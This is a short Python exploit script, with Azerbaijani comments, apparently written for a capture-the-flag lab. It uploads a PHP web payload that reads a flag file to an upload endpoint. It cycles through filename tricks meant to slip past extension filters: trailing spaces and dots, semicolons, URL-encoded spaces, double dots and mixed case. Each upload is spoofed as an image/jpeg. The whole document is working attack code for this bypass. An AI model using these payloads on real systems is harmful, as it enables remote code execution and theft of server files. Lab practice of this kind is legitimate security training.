import requests

url = "http://test-s3.web0x05.hbtn/task2/"

# Yoxlayacağımız fərqli filename kombinasiyaları
payloads = [
    "exploit2.php ",         # Sonunda boşluq
    "exploit2.php.",         # Sonunda nöqtə
    "exploit2.php;.jpg",     # Nöqtəli vergül hiyləsi
    "exploit2.php%20.jpg",   # URL encoded boşluq
    "exploit2.php..jpg",     # İkiqat nöqtə
    "exploit2.pHp"           # Böyük-kiçik hərf qarışığı
]

for name in payloads:
    files = {'file': (name, '<?php readfile("FLAG_2.txt") ?>', 'image/jpeg')}
    response = requests.post(url, files=files)
    print(f"Payload: {name} | Status: {response.status_code} | Response: {response.text.strip()}")
